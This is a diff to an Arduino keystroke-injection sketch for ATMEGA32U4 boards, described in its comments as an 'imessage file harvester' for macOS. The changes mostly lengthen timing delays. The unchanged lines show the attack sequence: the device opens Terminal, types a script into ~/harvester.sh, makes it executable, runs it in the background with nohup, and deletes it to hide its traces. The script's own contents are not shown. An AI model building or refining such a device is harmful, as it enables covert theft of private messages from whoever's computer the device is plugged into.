@@ -36,6 +36,7 @@ void setup()
 
   // macOS prologue, escapes new keyboard setup (macOS Sierra+)
   // Added by Naookie Sato, not a part of Duckuino
+  delay(500);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('w');
   Keyboard.releaseAll();
@@ -50,7 +51,7 @@ void setup()
   delay(500);
   typeKey(KEY_ESC);
 */
-  delay(100);
+  delay(500);
 
   // imessage file harvester
   // Compiled for ATMEGA32U4 Microcontrollers by Naookie Sato,
@@ -64,7 +65,7 @@ void setup()
 
   Keyboard.print("terminal");
 
-  delay(100);
+  delay(500);
 
   typeKey(KEY_RETURN);
 
@@ -74,19 +75,19 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(30);
+  delay(50);
 
   Keyboard.print("rm ~/harvester.sh");
 
   typeKey(KEY_RETURN);
 
-  delay(30);
+  delay(50);
 
   Keyboard.print("vim ~/harvester.sh");
 
   typeKey(KEY_RETURN);
 
-  delay(300);
+  delay(500);
 
   // *****NOW TYPING BASH SCRIPT*****
   Keyboard.print("i");
@@ -198,25 +199,25 @@ void setup()
 
   typeKey(KEY_ESC);
 
-  delay(30);
+  delay(50);
 
   Keyboard.print(":wq");
 
   typeKey(KEY_RETURN);
 
-  delay(30);
+  delay(50);
 
   Keyboard.print("chmod +x ~/harvester.sh");
 
   typeKey(KEY_RETURN);
 
-  delay(30);
+  delay(50);
 
   Keyboard.print("nohup ~/harvester.sh &");
 
   typeKey(KEY_RETURN);
 
-  delay(30);
+  delay(50);
 
   Keyboard.print("rm -rf ~/harvester.sh");
 
